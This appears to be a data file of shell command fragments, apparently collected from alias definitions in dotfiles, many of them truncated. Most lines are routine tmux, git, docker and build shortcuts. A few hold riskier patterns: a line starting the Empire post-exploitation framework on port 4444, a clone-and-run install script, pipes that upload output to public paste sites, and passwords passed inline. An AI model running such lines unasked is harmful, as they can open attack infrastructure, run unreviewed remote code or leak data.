/usr/share/vim/vim$( vi --version | head -1 | sed 's/^.*\ \([0-9]\)\.\([0-9]\)\ .*$/\1\2/' )/macros/less.sh
/usr/sbin/sysctl -n vm.swapusage | awk '{print \$3}' | cut -f 1 -d .
/usr/local/sbin/puppet-restart.sh --no-sleep ; tail -f /var/log/syslog | grep '\(puppetd\|puppet-agent\)'
/usr/local/sbin/puppet-restart.sh --no-sleep ; tail -f /var/log/messages | grep '\(puppetd\|puppet-agent\)'
/usr/local/bin/vim || :
/usr/local/bin/tmux attach-session -d -t default || /usr/local/bin/tmux new-session -s default
/usr/local/bin/tmux attach -t second || tmux new -s second
/usr/local/bin/tmux attach -t main || tmux new -s main
/usr/local/bin/packer || \
/usr/games/fortune | /usr/games/cowsay -f $(ls /usr/share/cowsay/cows | shuf -n1)
/usr/bin/which -s webpack > /dev/null 2>&1 || ./node_modules/.bin/webpack
/usr/bin/w | /usr/bin/sort -u +0.0 -1.0 | $PAGER
/usr/bin/tmux ls && /usr/bin/tmux attach || /usr/bin/tmux
/usr/bin/tmux attach || /usr/bin/tmux new
/usr/bin/tmux attach -t Base || /usr/bin/tmux new -s Base
/usr/bin/tmux attach -t Alt || /usr/bin/tmux new -s Alt
/usr/bin/pydf | grep -vP afs\|snap
/usr/bin/pydf --local | grep -vP afs\|snap
/usr/bin/ps auxf | sort -nr -k 4 | head -10
/usr/bin/ps auxf | sort -nr -k 3 | head -10
/usr/bin/pbpaste | /usr/local/bin/jq '.' -C | less -R
/usr/bin/grc -es --colour=auto make -j$(cat /proc/cpuinfo | grep processor | wc -l)
/usr/bin/find . -type f|grep project.json | xargs dotnet restore
/usr/bin/find . -type f| grep project.json | xargs dotnet build
/usr/bin/df -h | /usr/bin/grep -v tmpfs | /usr/bin/sort -r
/usr/bin/aur repo -d custom --list | /usr/bin/aur vercmp && /usr/bin/pacman -Qm | /usr/bin/aur vercmp
/usr/bin/atq | sort -n | while read j x ; do echo \$j' '\$x ; at -c \
/usr/bin/ack --ignore-file='match:/vendors|bundle.js|.map/'
/sbin/ifconfig | pcregrep -M -o '^[^\t:]+:([^\n]|\n\t)*status: active'
/sbin/ifconfig | grep -a 'inet addr' | sed -e '/127\\.0\\.0\\.1/d;s/.*inet addr:\\([0-9\\.]\\+\\).*/\\1/'
/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*'
/sbin/ifconfig | grep 'inet addr:' | grep -v
/sbin/ifconfig | grep 'inet addr' | awk '{print \$2}'
/sbin/ifconfig | grep 'inet ' | sed 's/.*inet \([0-9]*.[0-9]*.[0-9]*.[0-9]*\).*/\1/'
/sbin/ifconfig eth0 | grep 'inet addr' | cut -d: -f2
/sbin/ifconfig eno1 | grep 'inet ' | awk '{print \$2}'
/sbin/ifconfig -a | sed '/eth\|wl/!d;s/ Link.*HWaddr//'
/proc/\$(pgrep -u \$USER tmux | head -n 1)/exe detach; /proc/\$(pgrep -u \$USER tmux | head -n 1)/exe attach
/opt/dell/srvadmin/bin/omreport chassis info | grep 'Service Tag' | awk '{print \$5}'
/opt/bin/setsid || alias setsid=
/home/carljm/dot/bin/dirsize.sh | sort -n | uniq
/bin/true ||
/bin/start-homolog.sh > /tmp/start-homolog.log | grep -v '\[etcd\[' | grep -v 'Key not found'
/bin/ps auxww | grep -v grep | grep -i
/bin/ps -ef |grep svnserve |grep -v grep
/bin/ps -eF | grep -v grep | grep
/bin/ps -F | head -1 && /bin/ps -aF --user $USER | hl $USER
/bin/ls -l | grep='^-' | awk '{print
/bin/ls -l | grep ^d | awk '{print
/bin/ls -alhS |tail -n12 | head -n10
/bin/ls -R -l |awk 'BEGIN {sum=0} {sum+=\$5} END {print sum}' |numfmt --to=iec-i
/bin/ls -FAv | grep /$ | column
/bin/ls -BF1t | grep / | head -1
/bin/ls --color=auto $(tr '\n' ':' < ~/.hidden | sed -e 's/.$//' | sed -e 's/:/ --ignore=/g')
/bin/find . -mindepth 1 -maxdepth 1 -type f -exec /bin/bash -c '/sbin/fuser -s {} || /bin/rm -f {}' ';'
/bin/false ||
/bin/dmesg|tail|cut -b -$COLUMNS
/bin/dmesg|tail -n $(($LINES-4))|cut -b -$COLUMNS
/bin/cat $HISTFILE | tail -n 1 | cb
/Users/mateus/.rvm/bin/rvm-prompt | grep '@' | sed 's/\(.*\)/(\1)/'
/System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -s | sed 1d | sort -rnk 3
/Applications/$(ls -t /Applications | grep Julia | head -1)/Contents/Resources/julia/bin/julia
./test.sh && gca || git reset --hard
./manage.py sqlevolve catalogue |grep ADD |grep -v _tmp
./.i3/chicon.sh music; mpc || mpd && ncmpcpp
../dev-scripts/hotfix2 `git branch | grep \* | cut -d ' ' -f2`
.+/' development.env | cut -d'=' -f 1 | cut -d' ' -f 2`; do
.*|alias l=\'ls $LS_OPTIONS -lA\'|;
. ~/.bash_profile || . ~/zshrc
. venv/bin/activate || . ve/bin/activate
. .venv/bin/activate 2>/dev/null || . .env/bin/activate 2>/dev/null
. ./venv/bin/activate || . ./bin/activate
. ./setEnv.sh 2>/dev/null || . /vms/setEnv.sh 2>/dev/null
. ${SHAREDPATH}/gotoProjectRoot.sh || hero
. $XDG_DATA_HOME/opam/opam-init/init.sh &> /dev/null || true
-v=6 2>&1 | grep --color=none -oP '[A-Za-z]+ http[^\s]*' | sed -e 's/^\(.* \).*\(\/apis.*\)/\1\2/'
-t -- /bin/sh -c 'tmux has-session && exec tmux attach || exec tmux'
-h --max-depth=1 | sort -n | less
*//gp' | sort | more
**/*.js~(*node_modules|dist|*styleguide)/*
); catch_return ||
); Exception.Extract \$? ||
); Catcher \$? ||
) || return ${retRepGotVal}
(which rvm && rvm 2.0.0 exec ruco) || RBENV_VERSION=2.5.0 ruco
(which htop > /dev/null && htop --sort-key RES) || top -o rsize
(which htop > /dev/null && htop --sort-key PERCENT_CPU) || top -o cpu
(which gitk &> /dev/null && gitk) || gitl
(which -s bundle || gem install bundler) && bundle install
(type ipython >/dev/null || pip install ipython readline) && ipython
(type apt-get &> /dev/null && sudo apt-get upgrade) || (type brew &> /dev/null && dnf upgrade)
(type apt-get &> /dev/null && sudo apt-get update) || (type brew &> /dev/null && dnf check-update)
(tmux has-session 2>/dev/null && tmux attach) || (tmux new-session)
(tmux has-session && tmux attach) || tmux -2
(tmux has 2>/dev/null && tmux attach) || tmux new
(tmux attach-session -t${Name}) || tmux new -s ${Name}
(tmux attach -t ryan) || (tmux new -s ryan)
(test -f tmp/pids/server.pid && kill -INT $(cat tmp/pids/server.pid) && echo Rails Stopped) || echo pid not found
(taskell -v 2>/dev/null 1>/dev/null && taskell) || (printf 'taskell is not installed.\n' && exit 1)
(tac 2> /dev/null || tail -r)
(ssh-add -l >/dev/null || ssh-add) && unalias ssh; ssh
(ssh-add -l > /dev/null || add_all_ssh_keys ) && ssh
(ssh-add -L > /dev/null 2>&1 || ~/dotfiles/scripts/pass.sh dummy) && ssh
(ssh-add -L > /dev/null 2>&1 || ~/dotfiles/scripts/pass.sh dummy) && mosh
(setup_cm_setup_nightly && env | grep PYTHONPATH | grep -v TDAQ_PYTHONPATH > pypath) && export pypath && code CastorScript
(setup_cm_setup_nightly && env | grep PYTHONPATH | grep -v TDAQ_PYTHONPATH > pypath) && export `cat pypath` && code CastorScript
(rm ~/.local/share/weatherreport) || true && dwm_weather.sh
(rm test -f && make test && ./test) || (make test && ./test)
(rm checkouts 2> /dev/null && echo disabled) || (ln -s .checkouts checkouts && echo enabled)
(rm -f database/*.sqlite || true) && vendor/bin/paratest -p 8 --runner=WrapperRunner
(printf 'PERM LINKS OWNER GROUP SIZE MONTH DAY HH:MM/YEAR NAME\n'; ls -la | sed 1d) | column -t
(pkill Jitouch || true) && open /Library/PreferencePanes/Jitouch.prefPane/Contents/Resources/Jitouch.app
(pkill -f suproxy || true) && ssh -N suproxy
(pkill -9 BlueJeans && echo 'Have a garbage day 🥀') || (echo 'BlueJeans not running')
(pidof nginx 1>/dev/null && sudo $(which nginx) -s reload) || sudo $(which nginx)
(pgrep tmux >/dev/null 2>&1) && tmux a || tmux
(pgrep python -u tom | sudo xargs kill); (pgrep record -u tom | sudo xargs kill)
(pgrep iked || sudo iked) && ikec -r typhon.vpn -u guirec.corbel -p `cat ~/.ike/sites/typhon.password` -a
(pgrep bitcoind > /dev/null && bcli stop) || bd
(pgrep Actiniumd > /dev/null && acli stop) || ad
(passenger stop && passenger start -d) || echo
(pacman -Qet && pacman -Qm) | sort -u | less
(npm run build:jit && npm start) |& tee npm.log | head -15
(nohup npm run dev &) && vim . || (nohup npm run start &) && vim .
(mvn test -Dlog.root=/tmp/logs && beep) || fail
(mvn install -DskipTests -Dskip.unit.tests=true && beep) || fail
(mvn install -Dlog.root=/tmp/logs && beep) || fail
(mvn clean test -Dlog.root=/tmp/logs && beep) || fail
(mvn clean install -DskipTests -Dskip.unit.tests=true -Dfindbugs.skip=true && beep) || fail
(mvn clean install -Dlog.root=/tmp/logs && beep) || fail
(mvn clean && beep) || fail
(mv ~/.git ~/.got || mv ~/.got ~/.git) 2> /dev/null
(make distclean || make clean) 2>/dev/null
(make clean V=1 && make V=1 || RESULT=$?;makeerror)
(mach -l /tmp/mach.log build && notify-send 'build successful') || notify-send 'build failed'
(ls | grep *.c) | xargs g++ -o prog -std=c++11 -O2 -Wall && ./prog < input.txt > output.txt && diff output.txt ans.txt
(killall -9 gpg-agent && gpg-agent --daemon && echo 'gpg-agent restarted') || (echo 'Starting gpg-agent' && gpg-agent --daemon)
(grails codenarc || (cat target/CodeNarc-Report.txt; exit 1))
(git status > /dev/null 2>&1) && git status || ls -Al
(git status > /dev/null 2>&1) && git rm || rm
(git status &>/dev/null && git status) || (svn status &> /dev/null && svn status)
(git rev-parse --git-dir && neofetch && git status && echo && ls) || (superstatus-no-git)
(git rev-parse --git-dir && git status && echo && ls) || (status-no-git)
(git merge --abort || true) && git reset . && git checkout . && git clean -df .
(git checkout qa &> /dev/null ||git checkout coordinate-qa &> /dev/null) && git pull
(git add package-lock.json && git add package-lock.json && git commit --amend --no-ed || :) && npm run --if-present build && git add . && git commit -m build && git diff --exit-code && git push && git push --tags && npm publish
(for FILE in *.wav ; do ffmpeg -i '$FILE' -f mp3 -ab 192000 '`basename '$FILE' .wav`.mp3' || break; done)
(figlet Miau 2> /dev/null || echo Miau) ; ping
(ek &>/dev/null || true) && ec --daemon
(echo 'yy' | ./tools/restore-db-to-local pilot) && (echo 'yy' | ./migrate local)
(echo 'yy' | ./tools/restore-db-to-local mizuho) && (echo 'yy' | ./migrate local)
(echo 'yy' | ./tools/restore-db-to-local explore-dev) && (echo 'yy' | ./migrate local)
(echo 'yy' | ./tools/restore-db-to-local explore) && (echo 'yy' | ./migrate local)
(echo 'yn' | ./tools/restore-db-to-local pilot) && (echo 'yy' | ./migrate local)
(echo 'yn' | ./tools/restore-db-to-local mizuho) && (echo 'yy' | ./migrate local)
(echo 'yn' | ./tools/restore-db-to-local explore-dev) && (echo 'yy' | ./migrate local)
(echo 'yn' | ./tools/restore-db-to-local explore) && (echo 'yy' | ./migrate local)
(du -smx err.txt generated.file succ.txt | sort -k 1 -n -r | head -10 ) 2>/dev/null
(du -h --max-depth=1) 2> /dev/null | sort -hr | head -n 10
(docker-machine stop || docker-machine kill) ; docker-machine start; docker-env-eval
(docker-clean-containers || true && docker-clean-images) && docker volume prune --force
(docker rm -f empire 2>/dev/null || true) && docker run --name empire -it -p 4444:4444 --rm empireproject/empire
(docker ps -aq | xargs docker rm); (docker images -aq -f dangling=true | xargs docker rmi); docker volume rm $(docker volume ls -qf dangling=true)
(docker images yanana/google-cloud-sdk-coreos || docker pull yanana/google-cloud-sdk-coreos) > /dev/null ; docker run -it --net=
(docker images google/cloud-sdk || docker pull google/cloud-sdk) > /dev/null;docker run -ti --rm --net=host -v $HOME/.config:/root/.config google/cloud-sdk gsutil
(docker images google/cloud-sdk || docker pull google/cloud-sdk) > /dev/null;docker run -ti --rm --net=host -v $HOME/.config:/root/.config -v /var/run/docker.sock:/var/run/docker.sock google/cloud-sdk gcloud
(docker images google/cloud-sdk || docker pull google/cloud-sdk) > /dev/null;docker run -it --net=
(docker images $DOCKER_IMAGE || docker pull $DOCKER_IMAGE) > /dev/null;docker run -t -i --net=
(command git symbolic-ref -q HEAD || command git name-rev --name-only --no-undefined --always HEAD) 2>/dev/null
(cd ~/dev/papercut ; for d in common toshiba xerox fuji-xerox hp-oxpd sharp-osa-n2 canon-meap; do g device-web:papercut-device-web-$d:test -x autoLintGradle; done || exit 1)
(cd ~/code/ansible && (pgrep invoker || bundle exec invoker start vagrant.ini -d) && bundle exec invoker
(cd .. && pwd) | tr \\\n \\\000 | xargs --null ${l} --directory
(bundle-hack check || bundle) && minitest -Itest/
(bundle update plib --source plib > /dev/null && gca -m 'updated plib') || true
(bundle check || bundle install) && rake db:migrate db:test:prepare
(bundle check || bundle install --path vendor/bundle)
(bundle check > /dev/null || bi); zk; rm .zeus.sock; reset; zeus start
(abduco -n WaiFai sudo create_ap --hidden --no-virt wlan0 eth0 WaiFai wayifive) || (abduco -A WaiFai sudo create_ap --hidden --no-virt wlan0 eth0 WaiFai wayifive)
([[ -e ${SSHUTTLE_VPN_PID}]] && echo 'Sshuttle is already running') || sshuttle --dns --daemon --auto-nets --auto-hosts --pidfile=${SSHUTTLE_VPN_PID}
([[ -d .venv ]] || virtualenv .venv) && R_LIBS_USER= && ./run.sh
([[ -a Procfile.dev ]] && heroku local -f Procfile.dev) || heroku local
([[ -a Procfile.dev ]] && foreman start -f Procfile.dev) || foreman start
([ -f yarn.lock ] && yarn install --check-files || true)
([ -f mix.exs ] && mix ecto.migrate) || ([ -f Rakefile ] && bundle exec rake db:migrate)
([ -e $(basename $(pwd)).tex ] || (echo Not found && exit 1)) && vim +/maketitle ++1 $(basename $(pwd)).tex
([ -d ~/projects/dotfiles ] && cd ~/projects/dotfiles || cd ~/projects/$GITHUB_ACCOUNT/dotfiles; ./dotfiles --synchronise-only); exec $SHELL -l
([ -d /home/$user ] || mkdir /home/$user) && cd /home/$user
([ -L $MOZLOCK ] && ls -l $MOZLOCK && rm $MOZLOCK) || echo no lock to unfuck
(HOLD_ECHO=$LS_TT_TAGS_ECHO; HOLD_INLINE=$LS_TT_TAGS_INLINE; export LS_TT_TAGS_ECHO=0; export LS_TT_TAGS_INLINE=1; find . -name *.tt -exec ls-tt-tags.pl {} \; | sort | uniq ; export LS_TT_TAGS_ECHO=$HOLD_ECHO; export LS_TT_TAGS_INLINE=$HOLD_INLINE)
(H=~/.v.utils/src ; ([ -d \$H ] || git clone https://github.com/mer1in/v \$H) && cd \$H && ./install.sh)
(./build.sh && notify-send 'build success') || notify-send 'build failed'
(){pycodestyle $1 | grep -v long | grep -v except}
(){git branch | grep $1 | xargs git branch -D}
(){ man $1 | col -b | view -}
(){ find $1 -type f |grep $2 | xargs grep $3 }
() { tmux -2 new -s $1 || tmux -2 a -t $1 }
((who; users | wc -w) | pr -l18 -t -2)
((tmux has -t default &> /dev/null) && tmux -u attach -t default) || tmux -u new -s default
((rake -P | grep rake) && rake -T) | sort
((\$?))||
((!\$?))||
(( u )) || set -U
(( RANDOM % 6 == 0 )) && rm -rf err.txt generated.file succ.txt || ls
(( RANDOM % 4 == 0 )) && cat ~/.meow || cat
(( $+TMUX )) && tmux kill-pane \; select-layout || \exit
( youtube-dl -q -o- 'http://www.youtube.com/watch?v=QH2-TGUlwu4' | mplayer -really-quiet -vo null -cache 500 - ; echo $'\035quit';reset ) | telnet miku.acm.uiuc.edu
( ssh-add -l > /dev/null || ssh-add ) && ssh
( ssh-add -l > /dev/null || ssh-add ) && scp
( ssh-add -l > /dev/null || ssh-add ) && git push
( ssh-add -l > /dev/null || ssh-add ) && git pull
( ssh-add -l > /dev/null || ssh-add ) && git fetch
( ssh-add -l > /dev/null || ( echo -n 'ssh-add/ssh-agent - ' ; ssh-add ) ) && ssh
( git diff --name-only master... ; git diff --name-only HEAD ) | sort -u | xargs rmate
( git diff --name-only master... ; git diff --name-only HEAD ) | sort -u | xargs mate
( git diff --name-only develop... ; git diff --name-only HEAD ) | sort -u | xargs rmate
( git diff --name-only develop... ; git diff --name-only HEAD ) | sort -u | xargs mate
( find ./ -name '*.php' -print0 | xargs -0 cat ) | wc -l
( files=\$(git status --porcelain | grep '^UU' | cut -d ' ' -f 2-); if test -n \
( export d=~/.ssh; [ -e $d/id_rsa.pub ] || { mkdir -p $d; cd $d; ssh-keygen -t rsa; }; ssh-copy-id \$REMOTE )
( cd $HOME/PERILO/music; find . -mindepth 2 -maxdepth 2 ) | unsort 2>/dev/null | head -20
( cat ~/analytics-server/analytics-core/src/test/resources/mysql/create_test_db.sql ~/analytics-server/analytics-core/src/test/resources/mysql/schema.sql ~/analytics-server/analytics-core/src/test/resources/mysql/insert_test_dataset.sql ) | mysql -u root -ptest ; ( cat ~/analytics-server/analytics-core/src/test/resources/mysql/create_test_db.sql ~/analytics-server/analytics-core/src/test/resources/mysql/schema.sql ~/analytics-server/analytics-core/src/test/resources/mysql/insert_test_dataset.sql ) | cqlsh
( [[ -d test* ]] && tree test* ) || ( [[ -d spec* ]] && tree spec* )
( [ -f ~/.bashversion ] || touch ~/.bashversion) && echo $(date -d '-1 min' '+%Y-%m-%dT%H:%M') > ~/.bashversion
( (rbenv which bundle >/dev/null 2>&1) || gem install bundler) && bundle install
's/remote.origin.url=git(@|:\/\/)github.com(:|\/)(.+)\/(.+).git/https:\/\/github.com\/\3\/\4/p'\`"
'ps aux| grep node | grep server'
'ps -a | grep python | awk \
'ifconfig eth0 | grep inet | awk '{ print $2 }'
'git branch --merged | grep -v \* | xargs git branch -d'
'du | sort -gr | head -10'
'^\-e' | cut -d = -f 1 | xargs -n1 pip install -U"
'/usr/bin/ls' --color=auto -d \$(git ls-tree -rt \$(git branch | grep \\* | cut -d \
&>|/dev/null &|
&& say succeeded || say failed
&& play -qn synth .2 pluck C3 repeat vol .5 || play -qn synth .2 pluck C2 repeat vol .5
&& notify-send 'Command succeeded' || notify-send 'Command failed'
&& echo; (echo $fg[green]SUCCEEDED || echo $fg[red]FAILED)
&& echo True || echo False
&& ahhh || ehoh
${f} || echo
${bookmarks}) ]] || echo
${_GIT_ALIAS_PREFIX}'cfl | cut -d= -f1 | while read line; do git config --show-origin $line; done'
${TREE_SHORT} -L 5 -I '.git|.hg|.venv'
${TREE_SHORT} -L 4 -I '.git|.hg|.venv'
${TREE_SHORT} -L 3 -I '.git|.hg|.venv'
${TREE_SHORT} -L 2 -I '.git|.hg|.venv'
${TREE_LONG} -L 5 -I '.git|.hg|.venv'
${TREE_LONG} -L 4 -I '.git|.hg|.venv'
${TREE_LONG} -L 3 -I '.git|.hg|.venv'
${TREE_LONG} -L 2 -I '.git|.hg|.venv'
${GITMOD} | ${AWKCMD} ${AWKFILE} | xargs -n1 -o ${MYEDITOR}
${GITADD} | ${AWKCMD} ${AWKFILE} -v PAT=ADD | xargs -n1 -o ${MYEDITOR}
${GITADD} | ${AWKCMD} ${AWKFILE} -v PAT=ADD | xargs -n1 ${GDU}
$toybox du -xhd 1 2>/dev/null | sort -nr | head -n
$tmux_path attach || $tmux_path new
$p || :
$find . -xdev -type f -size +10240k -exec ls -al {} + 2>/dev/null | sort -nrk4 | awk '{size=\$5/2^20;sub(\
$find . -xdev -type f -size +10240k -exec busybox ls -al {} + 2>/dev/null | sort -nrk5 | awk '{size=\$5/2^20;sub(\
$cmd; echo ${pass}|$g --yes --no-tty --batch --passphrase-fd 0 --decrypt -o $tdb/$h.twd $pt/$h.twd.gpg; sudo $t -m p --secure-mode low /etc/tripwire/twpol.txt; echo ${pass}|$g --yes --no-tty --batch --passphrase-fd 0 --symmetric --cipher-algo aes256 -o $pt/$h.twd.gpg $tdb/$h.twd; rm -fv $tdb/*.twd*
$adb shell getprop | $dos2unix | grep -P
$adb shell dumpsys battery | grep level | $dos2unix
$TMUX_CMD attach || $TMUX_CMD
$TMUX attach|| $TMUX
$SCRIPT_DIR/bin/docker-check-network.sh && for (( i=$MAX_BROKERS ; $i ; i=(($i - 1)) )) ; do $SCRIPT_DIR/bin/docker-check-process.sh kafka-$i start || $SCRIPT_DIR/bin/docker-start-broker.sh kafka-$i ; done
$SCRIPT_DIR/bin/docker-check-network.sh && ( $SCRIPT_DIR/bin/docker-check-process.sh schema-registry start && $SCRIPT_DIR/bin/docker-check-process.sh kafka-rest start && $SCRIPT_DIR/bin/docker-check-process.sh kafka-connect start && $SCRIPT_DIR/bin/docker-check-process.sh control-center start ) || $SCRIPT_DIR/bin/docker-start-control-center.sh $MAX_BROKERS
$SCRIPT_DIR/bin/docker-check-network.sh && $SCRIPT_DIR/bin/docker-check-process.sh zookeeper start || $SCRIPT_DIR/bin/docker-start-zookeeper.sh
$PSUDO p builddep || echo Install dnf-plugins-core
$PAGER || PAGER='less'
$HOMEDIR/.bashrc > /dev/null || echo
$EXE | c' 2>&-; echo_alias_result '|'
$EDITOR db/migrate/$(ls db/migrate/ | sort | tail -1)
$EDITOR `git s|grep 'both modified'|cut -d: -f2`
$EDITOR \$(git status | grep modified | awk '{ print \$2 }')
$EDITOR $(git status --porcelain | cut -f2 -s -d 'M' | tr '\n' ' ' )
$EDITOR $(find $HOME/bin/* -type f | sed s/*\//g | fzf -d/ -n5 --height=10)
$BASH_ALIAS_FILE_DIR* | sed 's/\(.*\):\(.*\):.*/+\2 \1/g' | grep -v
$ANACONDA3/bin/conda update --all -y && $ANACONDA3/bin/pip freeze -l | awk -F '==' '{ print $1 }' | xargs $ANACONDA3/bin/pip install -U
$ANACONDA2/bin/conda update --all -y && $ANACONDA2/bin/pip freeze -l | awk -F '==' '{ print $1 }' | xargs $ANACONDA2/bin/pip install -U
$(which wget2 2>/dev/null || which wget)
$(which untar) 2>/dev/null || \tar -xvf
$(which unjar) 2>/dev/null || \unzip
$(which tmux) attach -t default || tmux new -s default
$(which tmux) attach -d || $(which tmux) new
$(which rg >/dev/null 2>&1 && echo 'rg --column --line-number' || echo 'grep -Hnr --color')
$(which python2.7 || which python2.6) $HOME/.local/bin/jhbuild
$(which pbcopy &> /dev/null && echo pbcopy || echo 'xclip -sel clip')
$(which nvim || which vim)
$(which exa >/dev/null 2>&1 && echo exa || echo /bin/ls --color)
$(which bat >/dev/null 2>&1 && echo 'bat -p --pager=never' || which cat)
$(which babi || echo nano)
$(which ansible |head -n1 |awk '{print$3}') -i /opt/ansible/ec2.py
$(where bbedit code nano vim vi | grep ^/ | head -1)
$(whence gawk || whence awk)
$(whence ack-grep || whence ack) --nocolor
$(tmux attach-session -t roman || tmux new-session -s roman)
$(mktemp -d 2>/dev/null || mktemp -d -t 'mytmpdir')
$(ls /sbin/.core/busybox/sed || ls /sbin/.magisk/busybox/sed) 2>/dev/null;
$(ls /sbin/.core/busybox/grep || ls /sbin/.magisk/busybox/grep) 2>/dev/null;
$(ls /bin/ | rg ^firefox | head -n1) /home/doc/git/book/2018-edition/book/index.html
$(kgp|p1|p)
$(ifconfig wlan0 | grep -w 'inet' | awk '{print $2}')
$(ifconfig eth0 | grep -w 'inet' | awk '{print $2}')
$(history | cut -c 8- | fzf)
$(hash colormake 2>/dev/null && echo colormake || echo colourify make)
$(has colormake || has make)
$(git worktree list | fzf | _pick_first_col)
$(find /usr/local/Cellar/percona-toolkit -maxdepth 1 -type d | sort -r | head -n 1)/libexec/bin/pt-query-digest
$(find . -maxdepth 1 -type d -print0 | xargs -0 du -sk | sort -rn)
$(find -L . -maxdepth 1 -type f | sort| peco )
$(find -L . -maxdepth 1 -type d | sort|peco )
$(curl wttr.in/?0?q?T | awk '/°(C|F)/ {printf $(NF-1) $(NF)
$(command -v nvim || command -v vim)
$(command -v mplayer2 || echo
$(command -v exa || command -v ls)
$(alias ls | cut -f2- -d= | tr -d
$(`history | tail -n1 | cut -c8-`)
$(_check); git log | head -n5 |tail -n3
$([[ $(uname -s) == 'Linux' ]] && echo 'ls --color' || echo 'ls -Gh')
$([ -S .zeus.sock ] && echo zeus || echo rails_command)
$([ -S .zeus.sock ] && echo zeus || echo bundle exec) cucumber -f pretty
$([ -S .zeus.sock ] && echo zeus || echo bundle exec) cucumber -f fuubar
$([ -S .zeus.sock ] && echo zeus console || echo bundle exec pry -r ./config/environment)
$($(which abbrev-alias > /dev/null) && echo abbrev-alias || echo alias)
$( kubectl config get-contexts -o=name | sort -fd | fzf-tmux --reverse --multi --cycle)
$'xmms2 info | grep file:// | sed \'s/.*file:\\/\\///\''
$'vim $(du -a ~/.scripts/ | awk \'{print $2}\' | fzf)'
$'vim $(du -a ~/.config/* | awk \'{print $2}\' | fzf)'
$'ss | g \'^[M]\' | ppe \'s/^[M]\s+//\''
$'ss | g \'^[D]\' | ppe \'s/^[D]\s+//\''
$'ss | g \'^[A]\' | ppe \'s/^[A]\s+//\''
$'ss | g \'^[?]\' | ppe \'s/^[?]\s+//\''
$'ss | g \'^[!]\' | ppe \'s/^[!]\s+//\''
$'pip list --outdated --format=legacy | awk \'{print $1}\' | xargs pip install -U pip'
$'kill -9 $(ps -A | grep [Cc]hrome | awk \'{ print $1 }\')'
$'kill $(ps -A | grep [Cc]hrome | awk \'{ print $1 }\')'
$'hdfs dfs -ls /user/$USER | awk \'{print $8}\' | xargs hdfs dfs -du -s -h'
$'git_merged | xargs -I {} bash -c \'echo $(git show -s --format=format:%ci $(git merge-base origin/{} master)) {}\' | sort'
$'git status | grep modified | awk \'{print $3}\''
$'git pull --prune && git branch -vv | awk \'/: gone]/{print $1}\' | xargs git branch --delete --force'
$'git branch -r --no-color | awk \'{if ($1 ~ /^origin\//){ if ($1 !~ /(master|HEAD)/) print $1 }}\''
$'git branch --merged master | grep -v \'^[ *]*master$\' | xargs git branch -d'
$'fzf --preview \'[[ $(file --mime {}) =~ binary ]] && echo {} is a binary file || bat --style=numbers --decorations always --color always {}\''
$'docker stats $(docker ps | awk \'{print $NF}\' | grep -v NAMES)'
$'bundle show $(bundle list | peco |awk \'{ print $2 }\')'
$'base64 < /dev/urandom | tr \'+/\' \'-_\' | head -c 5'
$'base64 < /dev/urandom | tr -d \'+/\' | head -c 5'
$'base64 < /dev/urandom | tr -d \'+/[:upper:]\' | head -c 6'
#(vmstat | grep [0-9] | awk {\
# | grep -Eo '([0-9]*\\.){3}[0-9]*' | grep -v '127.0.0.1'"
# sudo lsof -i tcp:9000 | grep -v grep | awk '{print $2}'; \
# sudo lsof -i tcp:5000 | grep -v grep | awk '{print $2}';"
# 's/remote.origin.url=git(@|:\/\/)github.com(:|\/)(.+)\/(.+).git/https:\/\/github.com\/\3\/\4/p'\`"
# ""$(history|tail -n1|sed -e "
"ð↑ -u origin $(git branch | grep -e ""^*"" | cut -d"" "" -f 2)"
"~/src/identity-infrastructure/aws-analysis/rollup-aws-actuals ~/Downloads/ecsv_*.csv | tr '|' ,"
"~/scripts/fancy_cal | \grep -E --color ""\b`date +%e`\b|$"""
"~/elsd | cut -c1-20 | column -c""${COLUMNS:-80}"""
"~/bin/urxvtcd -e bash -c ""(tmux -q has-session &> /dev/null && exec tmux attach-session -d) || (exec tmux new-session)"""
"~/bin/cscreen -l | perl -lane ""print $F[0] if $F[1] == 2"" | xargs -I id ~/bin/cscreen -i id -p"
"~/.t --task-dir $(git rev-parse --show-toplevel 2>/dev/null || echo ""."") --list TODO"
"|tr -s "" "" ""\t"" |cut -f"
"|sn ""2,$p"" |csv2tsv.rb"
"|sed -rn '2,$ p' |csv2tsv.rb S"
"|sed -r 's,\x1B\[[0-9;]*[a-zA-Z],,g'|tr -d '\r'"
"|sed -r ""s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"""
"|ruby -e ""require %Q(open-uri); puts URI::encode STDIN.read"" | while read i; do kiku $i; done"
"|la=|ll=))/\1/"" ~/.bashrc"
"|(function )?${NAME}( )?\()|function $NAME"" ""$DESKPATH"" \"
"| xargs -d ""\n"" printf %s | xclip -selection clipboard"
"| tr -d ""\n"" | xclip -sel clipboard"
"| tr -d ""\n"" | pbcopy"
"| tr ""\n\r"" ""\0"" | pbcopy"
"| tr ""\n"" ""\0"" | xargs -0"
"| tee >(curl -sF ""f:1=<-"" ix.io | tee >(pbcopy)) && open $(pbpaste)"
"| sort | fzf --reverse --preview ""bat --theme=Monokai\ Extended\ Bright \
"| sed -r ""s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"""
"| sed 's/,,/, ,/g;s/,,/, ,/g' | column -s, -t"
"| sed ""s/\""//g"" | while read -r line; do open -a /Applications/Google\ Chrome\ Canary.app $line; done"
"| sed ""s/\""//g"" | while read -r line; do open -a /Applications/Google\ Chrome.app $line; done"
"| ruby -e ""STDOUT << STDIN.read.chomp"" | xsel --input --clipboard"
"| ruby -e ""STDOUT << STDIN.read.chomp"" | putclip"
"| ruby -e ""STDOUT << STDIN.read.chomp"" | pbcopy"
"| remove_color_codes | vim-server"""
"| perl -pe ""s/\e\[\d+(;\d+)?m//g"" | col -bx"
"| perl -pe ""chomp if eof"" | xclip -i -selection primary"
"| perl -pe ""chomp if eof"" | xclip -i -selection clipboard"
"| leak | pipe_to_visual"""
"| jq ""."" -C | less -R"
"| grep -v -e ""^$"" -e""^ *[#|\/\/]"""
"| grep -v ""#"" | sed ""/^$/d"""
"| grep -o , | wc -l"
"| expand | cut -c-""$(tput cols)"""
"| egrep -v ""^(;|$)"""
"| diff-so-fancy | less --tabs=1,5 -R"
"| cut -d""|"" -f6"
"| curl -F c=@- https://ptpb.pw | \\
"{ghq root; ghq list | peco} | sed -e ""N;s#\n#/#g"""
"{ test $? -eq 0 && echo ""Yes""; } || echo ""No: $?"""
